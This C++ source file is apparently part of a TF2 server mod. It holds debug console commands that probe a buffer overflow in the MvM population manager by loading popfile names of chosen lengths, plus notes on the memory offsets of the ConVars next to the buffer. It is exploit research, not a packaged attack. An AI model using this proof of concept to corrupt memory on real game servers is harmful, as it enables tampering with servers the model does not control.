#include "mod.h"
#include "stub/populators.h"


/* the full path must be 259 chars long:
/pool/Game/SteamCMD/tf2/tf/custom/d/scripts/population/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.pop
/pool/Game/SteamCMD/tf2/tf/custom/d/scripts/population/aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa[...]
*/

/*
ServerLinux 20160531a
+0x0000 s_pszNextPopfile
+0x0104 <padding>
+0x0120 tf_grapplinghook_enable
+0x0180 tf_mvm_buybacks_per_wave
+0x01e0 tf_mvm_buybacks_method
+0x0240 tf_mvm_respec_credit_goal
+0x02a0 tf_mvm_respec_limit
+0x0300 tf_mvm_respec_enabled

ServerWin 20160531a
TODO

ClientOSX 20160531a
(TODO: relative offsets)
+0x0000 00f1f230 s_pszNextPopfile
+0x0104 00f1f334 hide_server
+0x0160 00f1f390 mp_waitingforplayers_time
+0x01bc 00f1f3ec tf_gamemode_arena
+0x0218 00f1f448 tf_gamemode_cp
+0x0000 00f1f4a4 tf_gamemode_ctf
+0x0000 00f1f500 tf_gamemode_sd
+0x0000 00f1f55c tf_gamemode_rd
+0x0000 00f1f5b8 tf_gamemode_pd
+0x0000 00f1f614 tf_gamemode_tc
+0x0000 00f1f670 tf_beta_content
+0x0000 00f1f6cc tf_gamemode_payload
+0x0000 00f1f728 tf_gamemode_mvm
+0x0000 00f1f784 tf_gamemode_passtime
+0x0000 00f1f7e0 tf_gamemode_misc
+0x0000 00f1f83c tf_bot_count
+0x0000 00f1f898 tf_teamtalk
+0x0000 00f1f8f4 tf_ctf_bonus_time
+0x0000 00f1f950 tf_skillrating_debug
+0x0000 00f1f9ac tf_competitive_mode
+0x0000 00f1fa08 tf_competitive_preround_duration
+0x0000 00f1fa64 tf_competitive_preround_countdown_duration
+0x0000 00f1fac0 tf_competitive_abandon_method
+0x0000 00f1fb1c tf_powerup_mode
+0x0000 00f1fb78 tf_powerup_mode_imbalance_delta


ConVar 20160531a
+0x00 vtable
+0x04 ConCommandBase *m_pNext
+0x08 bool m_bRegistered
+0x0c const char *m_pszName
+0x10 const char *m_pszHelpString
+0x14 int m_nFlags
+0x18 ConVar *m_pParent
+0x1c const char *m_pszDefaultValue
+0x20 char *m_pszString
+0x24 int m_StringLength
+0x28 float m_fValue
+0x2c int m_nValue
+0x30 bool m_bHasMin
+0x34 float m_fMinVal
+0x38 bool m_bHasMax
+0x3c float m_fMaxVal
+0x40 ...
+0x44 ...
+0x48 ...
+0x4c ...
+0x50 ...
+0x54 ...
+0x58 FnChangeCallback_t m_fnChangeCallback
+0x5c ...

ConCommand 20160531a
+0x00 vtable
+0x04 ConCommandBase *m_pNext
+0x08 bool m_bRegistered
+0x0c const char *m_pszName
+0x10 const char *m_pszHelpString
+0x14 int m_nFlags
+0x18 FnCommandCallback_t m_fnCommandCallback
+0x1c FnCommandCompletionCallback m_fnCompletionCallback
+0x20 bool m_bHasCompletionCallback         : 1
+0x20 bool m_bUsingNewCommandCallback       : 1
+0x20 bool m_bUsingCommandCallbackInterface : 1
+0x24 ...
+0x28 ...
+0x2c ...
+0x30 ...
+0x34 ...
+0x38 ...
+0x3c ...

*/


namespace Mod_Debug_PopMgr_Exploit
{
	const char *GenerateString(int len)
	{
		auto str = new char[len + 1];
		memset(str, 'A', len);
		str[len] = '\0';
		
		return str;
	}
	
	
	CON_COMMAND(sig_debug_popmgr_exploit_generate, "")
	{
		for (int i = 1; i < 300; ++i) {
			const char *str = GenerateString(i);
			
			char buf[1024];
			snprintf(buf, sizeof(buf), "tf/custom/mapcycle/scripts/population/%s", str);
			
			int fd = creat(buf, 0644);
			if (fd < 0) {
			//	DevMsg("creat failed for \"%s\":\n%s\n", strerror(errno));
			} else {
				close(fd);
			}
			
			delete str;
		}
	}
	
	
	bool LoadMission(int len)
	{
		const char *str = GenerateString(len);
		
		auto kv = new KeyValues("1");
		kv->SetString("map", "mvm_decoy");
		kv->SetString("popfile", str);
		
		bool result = g_pPopulationManager->LoadMvMMission(kv);
		
		kv->deleteThis();
		delete str;
		
		return result;
	}
	
	
	CON_COMMAND(sig_debug_popmgr_exploit_run, "")
	{
		if (args.ArgC() < 2) {
			Warning("Insufficient arguments\n");
			return;
		}
		
		int len = std::stoi(args[1], nullptr, 0);
		DevMsg("Setting popfile strlen to %d / 0x%x\n", len, len);
		
		if (LoadMission(len)) {
			DevMsg("SUCCESS\n");
		} else {
			DevMsg("FAILURE\n");
		}
	}
}
